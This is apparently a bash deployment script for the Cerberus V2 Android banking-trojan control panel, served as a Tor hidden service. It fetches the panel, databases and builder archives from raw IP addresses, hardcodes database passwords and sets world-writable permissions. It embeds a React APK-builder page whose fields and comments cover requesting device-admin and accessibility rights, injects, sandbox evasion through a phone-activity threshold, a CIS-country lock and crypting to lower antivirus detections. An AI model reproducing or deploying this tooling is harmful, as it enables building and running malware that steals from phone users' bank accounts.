#!/bin/bash


#LINK YERLERINE KENDI SUNUCUNUZU KOYARAK DOSYALARI INDIREBILIRSINIZ


apt update
apt install systemd nginx tor php-fpm mysql-server php php-cli php-xml php-mysql php-curl php-mbstring php-zip wget unzip curl -y
service apache2 stop

rm -rf /usr/share/tor/tor-service-defaults-torrc
rm -rf /lib/systemd/system/tor.service
read -r -d '' TORCONFIG << EOM
[Unit]
Description=TOR CONFIG

[Service]
User=root
Group=root
RemainAfterExit=yes
ExecStart=/usr/bin/tor --RunAsDaemon 0
ExecReload=/bin/killall tor
KillSignal=SIGINT
TimeoutStartSec=300
TimeoutStopSec=60
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOM

echo "$TORCONFIG" > /lib/systemd/system/tor.service

read -r -d '' ServiceCFG << EOM
HiddenServiceDir /var/lib/tor/cerberus
HiddenServicePort 80 127.0.0.1:8080
EOM

echo "$ServiceCFG" > /etc/tor/torrc
mkdir /var/www/tor

systemctl daemon-reload
systemctl restart nginx
systemctl restart tor

FPMVERSION=$(find /run/php/ -name 'php7.*-fpm.sock' | head -n 1)

read -r -d '' PHPCONFIGFPM << EOM
    location ~ \.php$ { 
        try_files \$uri =404; 
        include /etc/nginx/fastcgi.conf;
        fastcgi_pass unix:$FPMVERSION; 
    }
EOM

#READ HOSTNAME FOR NGINX WEBSITE
TORHOSTNAME=$(cat /var/lib/tor/cerberus/hostname)

read -r -d '' DefaultNGINX << EOM
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        root /var/www/html;
        index index.html;
        server_name _;
        
        add_header Access-Control-Allow-Origin "*";
        
        location ~ \.php$ {
        try_files \$uri =404;
        include /etc/nginx/fastcgi.conf;
        fastcgi_pass unix:/run/php/php7.2-fpm.sock;
    }
}
server {
    listen 8080 default_server;
    listen [::]:8080 default_server;
    root /var/www/tor;
    index index.php index.html index.htm index.nginx-debian.html;
    # Add index.php to the list if you are using PHP index index.html 
    #index.htm index.nginx-debian.html; server_name server_domain_or_IP;
     server_name $TORHOSTNAME;
    autoindex off;
 
    location ~ \.php$ {
        include fastcgi_params;
        fastcgi_split_path_info ^(.+\.php)(.*)$;
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php7.2-fpm.sock;
        }
        
     location ~* /\. {
        deny all;
        access_log off;
        log_not_found off;
    }
}
EOM

echo "$DefaultNGINX" > /etc/nginx/sites-available/default

cc

nginx -s reload
systemctl restart nginx
systemctl restart tor

wget http://185.132.124.238/users.sql
mv users.sql bot.sql

mysql -uroot --password="yArrAk123" -e "CREATE DATABASE bot /*\!40100 DEFAULT CHARACTER SET utf8 */;"
mysql -uroot --password="yArrAk123" -e "CREATE USER 'non-root'@'localhost' IDENTIFIED BY 'yArrAk123';"
mysql -uroot --password="yArrAk123" bot < bot.sql
mysql -uroot --password="yArrAk123" -e "GRANT ALL PRIVILEGES ON *.* TO 'non-root'@'localhost';"
mysql -uroot --password="yArrAk123" -e "FLUSH PRIVILEGES;"
rm -rf bot.sql

cd /home/
wget http://185.203.118.15/CERBERUS_V2.zip ; unzip CERBERUS_V2.zip
rm -rf restapi_v2
rm -rf source_mmm
cd panel_v2
rm -f -rf node_modules/
rm -f -rf build/

TORHOSTNAME=$(cat /var/lib/tor/cerberus/hostname)
read -r -d '' BUILD << EOM
import React from 'react';
import SettingsContext from '../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
import { try_eval } from '../serviceF';

class BuilderConfig extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          url: '',
          appName: '',
          adminName: '',
          AccessibilityName: '',
          tag: '',
          AccessKey: '',
          LaunchBotByActivity: '0',
          ICON: '',
          accessibility_page: '',
          EnableOrDisable: true,
          APKBUILDED: false
        }
    }

    onChangeappName = (e) => {
        this.setState({ 
            appName: e.target.value
        });
    }
    onChangeadminName = (e) => {
        this.setState({ 
            adminName: e.target.value
        });
    }
    onChangeAccessibilityName = (e) => {
        this.setState({ 
            AccessibilityName: e.target.value
        });
    }
    onChangetag = (e) => {
        this.setState({ 
            tag: e.target.value
        });
    }
    onChangeLaunchBotByActivity = (e) => {
        try {
            if(parseInt(e.target.value) >= 0 && parseInt(e.target.value) <= 1500)
            this.setState({ 
                LaunchBotByActivity: e.target.value
            });
        }
        catch (ErrorMsg) {

        }
    }
    
    componentWillMount() {
        this.LoadSettingsFromServer();
    }
    

    UpdatePanel() {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer('{"request":"startUpdateCommand"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else
				{
                    SettingsContext.ShowToastTitle('success', 'Update completed', result.msg);
				}
				
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'ERROR WHILE UPDATE. Show console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    async LoadSettingsFromServer() {
        while(isNullOrUndefined(SettingsContext.restApiUrl)) await SettingsContext.sleep(500);
        while(SettingsContext.restApiUrl.length < 15) await SettingsContext.sleep(500);
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer('{"request":"getGlobalSettings"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
                    this.LoadSettingsFromServer();
				}
				else
				{
					SettingsContext.arrayUrl = result.arrayUrl;
					SettingsContext.timeInject = result.timeInject;
					SettingsContext.timeCC = result.timeCC;
					SettingsContext.timeMail = result.timeMail;
					SettingsContext.pushTitle = result.pushTitle;
					SettingsContext.pushText = result.pushText;
                    SettingsContext.timeProtect = result.timeProtect;
                    SettingsContext.AccessKey = result.key;
					if(result.updateTableBots == 0) {
						SettingsContext.autoUpdateDelay = 0;
						SettingsContext.autoUpdateEnable = false;
					}
					else {
						SettingsContext.autoUpdateDelay = result.updateTableBots;
						SettingsContext.autoUpdateEnable = true;
					}
					SettingsContext.SaveSettingsCookies();
					this.setState({
                        LoadHash: Math.random().toString(),
                        AccessKey: result.key
                    });
                    
                    if(result.version != SettingsContext.youBotVersion) {
                        SettingsContext.ShowToastTitle('warn', 'Update started...', 'You need update');
                        this.UpdatePanel();
                    }
				}
				
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'ERROR LOADING SETTINGS FROM SERVER. Look console for more details.');
                SettingsContext.ShowToastTitle('error', 'warning', 'Try loading settings again...');
                console.log('Error - ' + ErrMgs);
                this.LoadSettingsFromServer();
            }
        }.bind(this));
    }

    GetAPKFromBuilder() {
        if(!this.state.EnableOrDisable) return;

        if(this.state.url.replace(' ','').length == 0) {
            SettingsContext.ShowToastTitle('warning', 'Please fill', 'Please select URL');
            return;
        }

        if(this.state.appName.replace(' ','').length == 0) {
            SettingsContext.ShowToastTitle('warning', 'Please fill', 'Please fill Name Application');
            return;
        }

        if(this.state.adminName.replace(' ','').length == 0) {
            SettingsContext.ShowToastTitle('warning', 'Please fill', 'Please fill Admin device Name');
            return;
        }

        if(this.state.AccessibilityName.replace(' ','').length == 0) {
            SettingsContext.ShowToastTitle('warning', 'Please fill', 'Please fill Accessibility Name');
            return;
        }

        if(this.state.LaunchBotByActivity.replace(' ','').length == 0) {
            SettingsContext.ShowToastTitle('warning', 'Please fill', 'Please select Launch bot by Activity');
            return;
        }

        if(this.state.tag.replace(' ','').length == 0) {
            SettingsContext.ShowToastTitle('warning', 'Please fill', 'Please fill TAG');
            return;
        }

        if(this.state.AccessKey.replace(' ','').length == 0) {
            SettingsContext.ShowToastTitle('warning', 'Please wait', 'Please wait, while loading info from you license, or go to another tab and go to main');
            return;
        }

        if(this.state.accessibility_page.replace(' ','').length == 0) {
            SettingsContext.ShowToastTitle('warning', 'Please upload', 'Please upload accessibility page from inject list.');
            return;
        }

        
        let request = $.ajax({
            type: 'POST',
            url: 'http://$TORHOSTNAME/builder/start.php',
            data: {
                url: this.state.url,
                name_app: this.state.appName,
                name_admin: this.state.adminName,
                name_accessibility: this.state.AccessibilityName,
                steps: this.state.LaunchBotByActivity,
                tag: this.state.tag,
                key: this.state.AccessKey,
                icon: this.state.ICON,
                accessibility_page: this.state.accessibility_page
            }
        });
        
        this.setState({
            EnableOrDisable: false
        });

        request.done(function(msg) {
			try {
                if(msg.toString().length < 10) {
                    SettingsContext.ShowToastTitle('error', 'ERROR', 'Session ended. Please refresh page!');
                    return;
                }
                this.DownloadFile(msg);
                this.setState({
                    EnableOrDisable: true,
                    appName: '',
                    adminName: '',
                    AccessibilityName: '',
                    tag: ''
                });
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error build APK.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }
    
    DownloadFile(contentFile) {
        console.log(contentFile);
        let element = document.getElementById('apkdownloadid');
        element.setAttribute('href', 'data:application/vnd.android.package-archive;base64,' + contentFile);
        let FileName = this.state.appName + ' build.apk';
        element.setAttribute('download', FileName);
        this.setState({
            APKBUILDED: true
        });
        SettingsContext.ShowToast('success', "APK builded");
    }

    

    SelectPNGFile(filess) {
        try {
            let CurrPNGFile = filess[0];
            if(CurrPNGFile.type == "image/png") {
                let reader = new FileReader();
                reader.readAsDataURL(CurrPNGFile);
                reader.onload = function (evt) {
                    let img = new Image();
                    img.src = evt.target.result;
                    img.onload = function(){
                        if(img.width >= 50 && img.height >= 50 && img.width <= 500 && img.height <= 500)
                        {
                            this.setState({ 
                                ICON: evt.target.result.split(',')[1],
                                PngFileValid: true
                            });
                            SettingsContext.ShowToast('success', "Load PNG file complete");
                        }
                        else {
                            this.setState({ 
                                PngFileValid: false
                            });
                            try_eval('document.getElementById("PngFileInput").value = "";');
                            SettingsContext.ShowToast('warning', "Image minimum size 50x50px, max size 500x500px");
                        }
                    }.bind(this);
                }.bind(this);
                reader.onerror = function (evt) {
                    this.setState({ 
                        PngFileValid: false
                    });
                    try_eval('document.getElementById("PngFileInput").value = "";');
                    SettingsContext.ShowToastTitle('error', 'Error', 'error reading file');
                }.bind(this);
            }
            else {
                this.setState({ 
                    PngFileValid: false
                });
                try_eval('document.getElementById("PngFileInput").value = "";');
                SettingsContext.ShowToastTitle('warning', 'PNG', "Please select only PNG files");
            }
        }
        catch (err) {
            this.setState({ 
                PngFileValid: false
            });
            SettingsContext.ShowToastTitle('error', 'Error', err);
        }
    }

    SelectHTMLFile(filess) {
        try {
            let CurrHTMLFile = filess[0];
            if(CurrHTMLFile.type == "text/html") {
                let reader = new FileReader();
                reader.readAsDataURL(CurrHTMLFile);
                reader.onload = function (evt) {
                    this.setState({ 
                        accessibility_page: evt.target.result.split(',')[1],
                        PngFileValid: true
                    });
                    SettingsContext.ShowToast('success', "Load HTML file complete");
                }.bind(this);
                reader.onerror = function (evt) {
                    this.setState({ 
                        PngFileValid: false
                    });
                    try_eval('document.getElementById("HTMLFileInput").value = "";');
                    SettingsContext.ShowToastTitle('error', 'Error', 'error reading file');
                }.bind(this);
            }
            else {
                this.setState({ 
                    PngFileValid: false
                });
                try_eval('document.getElementById("HTMLFileInput").value = "";');
                SettingsContext.ShowToastTitle('warning', 'HTML', "Please select only HTML files");
            }
        }
        catch (err) {
            this.setState({ 
                PngFileValid: false
            });
            SettingsContext.ShowToastTitle('error', 'Error', err);
        }
    }

/*
Connect URL: - here we indicate your domain in the format http://example.com (without a slash at the end) (namely http)
Name Application: - the name of your application
Name Admin Device: - the name that appears in the request for admin rights
Name Accessibility Service: - the name that appears in the accessibility request
Launch Bot By Device Activity - indicates the amount of activity with the phone (steps, movements, tilt angle) through which the bot will work (check for a real phone)
Tag: - Tag bot, you can write anything. It is convenient to use in order to understand which apk which bot.
Key Access: - traffic encryption key. You can take the key from the panel. Settings -> Key Access
Testing Mode: - Enables testing mode. Changes all names to TEST MODE, and disables the lock on the CIS countries.
Mini Crypt APK - can be used to reduce the number of detections
Debug is for developers. Do not just use it.
*/
    render () {
        
        let links = [];
        try {
            links = SettingsContext.arrayUrl.split(',');
        }
        catch (err) {}
        let linksHtml = [];
        links.forEach(function(lnk) {
            linksHtml.push(<a class="dropdown-item" onClick={() => {this.setState({url:lnk})}} href="#">{lnk}</a>);
        }.bind(this));
        
        return (
            <React.Fragment>
                <div class="input-group mb-3">
                    <div class="input-group-prepend">
                        <div class="dropdown">
                            <button disabled={!this.state.EnableOrDisable} class="btn btn-outline-success dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                Select URL
                            </button>
                            <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
                                {linksHtml}
                            </div>
                        </div>
                    </div>
                    <input class="form-control" value={this.state.url} readOnly/>
                </div>
                <hr />
                <div class="input-group">
                    <div class="input-group-prepend">
                        <span class="input-group-text" id="">Name Application</span>
                    </div>
                    <input class="form-control" value={this.state.appName} onChange={this.onChangeappName} readOnly={!this.state.EnableOrDisable}/>
                </div>
                <hr />
                <div class="input-group">
                    <div class="input-group-prepend">
                        <span class="input-group-text" id="">Admin device Name</span>
                    </div>
                    <input class="form-control" value={this.state.adminName} onChange={this.onChangeadminName} readOnly={!this.state.EnableOrDisable}/>
                </div>
                <hr />
                <div class="input-group">
                    <div class="input-group-prepend">
                        <span class="input-group-text" id="">Accessibility Name</span>
                    </div>
                    <input class="form-control" value={this.state.AccessibilityName} onChange={this.onChangeAccessibilityName} readOnly={!this.state.EnableOrDisable}/>
                </div>
                <hr />
                <div class="input-group">
                    <div class="input-group-prepend">
                        <span class="input-group-text" id="">Bot TAG</span>
                    </div>
                    <input class="form-control" value={this.state.tag} onChange={this.onChangetag} readOnly={!this.state.EnableOrDisable}/>
                </div>
                <hr />
                <div class="input-group">
                    <div class="input-group-prepend">
                        <span class="input-group-text" id="">Launch bot by Activity [0-1500]</span>
                    </div>
                    <input pattern="[0-9]*" class="form-control" value={this.state.LaunchBotByActivity} onChange={this.onChangeLaunchBotByActivity} readOnly={!this.state.EnableOrDisable}/>
                </div>
                <hr />
                <div class="input-group">
                    <div class="input-group-prepend">
                        <span class="input-group-text" id="">AccessKey</span>
                    </div>
                    <input class="form-control info" value={SettingsContext.AccessKey} readOnly={!this.state.EnableOrDisable}/>
                </div>
                <hr />
                <div class="input-group">
                    <div class="input-group-prepend">
                        <span class="input-group-text">Select ICON (PNG)</span>
                    </div>
                    <div class="custom-file">
                        <input  onChange={ (e) => this.SelectPNGFile(e.target.files) }  type="file" class="custom-file-input" id="IconUploadFile" />
                        <label class="custom-file-label" for="IconUploadFile">Choose file</label>
                    </div>
                </div>
                <hr />
                <div class="input-group mb-3">
                    <div class="input-group-prepend">
                        <span class="input-group-text">Select Accessibility Page (<a class="warn" href="http://cerberesfgqzqou7.onion/injects/accessibility.html" download>DOWNLOAD</a>)</span>
                    </div>
                    <div class="custom-file">
                        <input  onChange={ (e) => this.SelectHTMLFile(e.target.files) }  type="file" class="custom-file-input" id="HTMLUploadFile" />
                        <label class="custom-file-label" for="HTMLUploadFile">Choose file</label>
                    </div>
                </div>
                <hr />
                <a id="apkdownloadid" type="button" style={({float:'left'})} class={(this.state.APKBUILDED ? '' : 'disabled ') + "btn btn-outline-info"} disabled={!this.state.APKBUILDED}>Download apk</a>
                <button type="button" onClick={this.GetAPKFromBuilder.bind(this)} style={({float:'right'})} class="btn btn-outline-info" disabled={!this.state.EnableOrDisable}>Build APK now</button>
            </React.Fragment>
        );
    }

}


export default BuilderConfig;
EOM
echo "$BUILD" > /home/panel_v2/src/pages/BuilderConfig.js

curl -sL https://deb.nodesource.com/setup_11.x | sudo -E bash -
curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
sudo apt-get install -y nodejs
npm install
npm audit fix --force
npm run build && rm -f -rf /var/www/tor && mkdir /var/www/tor && cp -R build/. /var/www/tor

read -r -d '' CONFIGPHP << EOM
<?php 
if($_SERVER['SERVER_NAME'] != '$TORHOSTNAME') {
	die('Welcome to my website');
	return;
}
require_once 'medoo.php';

session_start();

// Using Medoo namespace
use Medoo\Medoo;

$database = new Medoo([
	// required
    'database_type' => 'mysql',
    'database_name' => 'bot',
    'server' => 'localhost',
    'username' => 'non-root',
    'password' => 'yArrAk123'
]);

function logOut() {
	session_destroy();
	header("Location: /");
	die();
}

function GetValidSubscribe() {
	global $database;
	
	if(!isset($_SESSION['key']))
		return false;
	
	$res = $database->get("users",
		"end_subscribe", [
		"privatekey" => $_SESSION['key']
		]);
		
	if(!res)
		return false;
	
	return (time()<=strtotime($res));
}
?>
EOM

echo "$CONFIGPHP" > /var/www/tor/config.php

read -r -d '' CONFIGJSON << EOM
{
    "domain":"$TORHOSTNAME",
    "lastBotVersion": "2.0.0.5",
    "license":"1500"
}
EOM

echo "$CONFIGJSON" > /var/www/tor/config.json

mkdir /test/
cd /test

wget http://185.132.124.238/sysbig.zip
wget http://185.132.124.238/control.zip
wget http://185.132.124.238/sysres.zip

unzip sysbig.zip ; unzip control.zip ; unzip sysres.zip

read -r -d '' USERSCONFIG << EOM
<?php
require_once 'medoo.php';

session_start();

$database = new Medoo([
	// required
    'database_type' => 'mysql',
    'database_name' => 'bot',
    'server' => 'localhost',
    'username' => 'non-root',
    'password' => 'yArrAk123'
]);

function getValidDaysSubscribe($infos) {
    $mytime = strtotime($infos) - time();
    if($mytime > 0) {
        return round(abs($mytime)/60/60/24);
    }
    return 0;
}
?>
EOM
echo "$USERSCONFIG" > control/content/config.php

mv sysres/source/gate/ /var/www/html
mv sysres/source/restapi/ /var/www/tor
mv control/ /var/www/tor
mv sysbig/ /
mv sysres/source/restapi/ /var/www/tor
mv /var/www/html/gate/* ../
mv /var/www/tor/restapi/* ../


chown -R root:root /sysbig/
chown -R root:root /sysbig/sourceproject
chmod 777 /sysbig/sourceproject/*
chown -R root:root /var/www
chown -R root:root /var/www/**
chown -R root:root /var/www/
chown -R root:root /var/www/tor
chown -R root:root /var/www/tor/*
chown -R root:root /var/www/tor/builder/*
chmod 777 /var/www/tor/
chmod 777 /var/www/tor/builder/*
chmod 777 /sysbig/
chmod 777 /var/www/html/
chmod 777 /var/www/html/*
chown -R root:root /var/www/.

nginx -s reload
systemctl restart nginx
systemctl restart tor

sudo apt-get install libc6-dev-i386 lib32z1 openjdk-8-jdk java-jdk
sudo apt install default-jdk
sudo apt update && sudo apt install android-sdk
cd /root/
wget https://dl.google.com/android/repository/sdk-tools-linux-3859397.zip ; unzip sdk-tools-linux-3859397.zip
cd /home/
wget https://dl.google.com/android/repository/sdk-tools-linux-3859397.zip ; unzip sdk-tools-linux-3859397.zip
export PATH=/root/tools:/root/tools/bin:$PATH
mkdir /root/android-sdk-linux
export ANDROID_HOME=/root/android-sdk-linux
cd $ANDROID_HOME
sudo wget https://dl.google.com/android/repository/tools_r25.2.3-linux.zip ; sudo unzip tools_r25.2.3-linux.zip
cd tools
sudo ./android update sdk --no-ui
sdkmanager 'platforms;android-27' --sdk_root=/home/Android/Sdk
/home/tools/bin/sdkmanager 'platforms;android-27' --sdk_root=/home/Android/Sdk
cat /var/lib/tor/cerberus/hostname
